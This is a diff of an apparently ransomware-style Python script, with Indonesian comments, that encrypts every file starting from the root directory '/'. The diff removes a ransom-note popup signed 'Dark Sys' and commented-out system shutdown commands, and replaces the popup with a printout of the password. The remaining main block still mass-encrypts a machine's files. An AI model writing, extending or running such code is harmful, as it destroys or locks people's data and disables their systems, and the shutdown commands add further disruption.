@@ -1,8 +1,6 @@
 import os
 import sys
 import base64
-import tkinter as tk
-from tkinter import messagebox
 from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
@@ -62,36 +60,8 @@ def encrypt_directory(directory, password, salt):
                 encrypted_count += 1
     return encrypted_count
 
-def show_ransom_message(encrypted_count):
-    root = tk.Tk()
-    root.withdraw()  # Sembunyikan window utama
-
-    message = f"""
-        PERHATIAN! SEMUA FILE ANDA TELAH TERENKRIPSI!
-
-        Jumlah file yang terenkripsi: {encrypted_count}
-
-        Password untuk membuka file anda adalah:
-
-        {PASSWORD}
-        
-
-        JANGAN MENCUBA MEMBUKA FILE SECARA MANUAL!
-        HAL INI DAPAT MERUSAK FILE SECARA PERMANEN!
-
-        ---
-
-        Dikembangkan oleh Dark Sys (Tzy's Superior Entity)
-    """
-
-    messagebox.showerror("FILE TERENKRIPSI!", message)
-
-    # Opsional: Matikan sistem setelah pesan muncul
-    # os.system("shutdown /s /t 1") # Untuk Windows
-    # os.system("shutdown -h now") # Untuk Linux
-
 if __name__ == "__main__":
     # Enkripsi semua direktori, mulai dari root
     encrypted_count = encrypt_directory("/", PASSWORD, SALT)
 
-    show_ransom_message(encrypted_count)
+    print(f"Semua file telah terenkripsi. Password: {PASSWORD}")
